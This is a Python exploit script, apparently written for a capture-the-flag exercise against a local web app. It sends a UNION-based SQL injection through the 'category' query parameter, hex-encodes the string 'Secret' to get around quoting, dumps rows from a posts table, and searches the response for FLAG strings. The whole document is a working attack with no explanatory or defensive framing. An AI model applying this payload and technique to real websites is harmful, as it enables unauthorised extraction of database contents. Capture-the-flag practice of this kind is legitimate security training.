import requests
import urllib.parse
import re

# Target URL
base_url = "http://127.0.0.1:33130/"
endpoint = "?category="

# Craft SQL injection payload with hex encoding
payload = "NoExist' UNION SELECT id,title,excerpt,content,category,author,created_at FROM posts WHERE category=0x536563726574--"

# URL encode the payload
url_encoded_payload = urllib.parse.quote(payload, safe='')

# Construct full URL
full_url = f"{base_url}{endpoint}{url_encoded_payload}"

print(f"[+] Target: {base_url}")
print(f"[+] Request URL: {full_url}")
print(f"[+] Payload: {payload}")
print("-" * 80)

try:
    response = requests.get(full_url, timeout=10)
    
    print(f"Status: {response.status_code}")
    print(f"Content-Type: {response.headers.get('Content-Type', 'N/A')}")
    print(f"Length: {len(response.text)} bytes")
    print("\nResponse:")
    print("-" * 80)
    print(response.text)
    print("-" * 80)
    
    # Check for Secret
    if "Secret" in response.text:
        print("\n[+] Found 'Secret' in response")
    
    # Search for flags
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        print(f"\n[!] FLAGS: {flags}")
    else:
        print("\n[-] No flags found")
    
except Exception as e:
    print(f"Error: {e}")
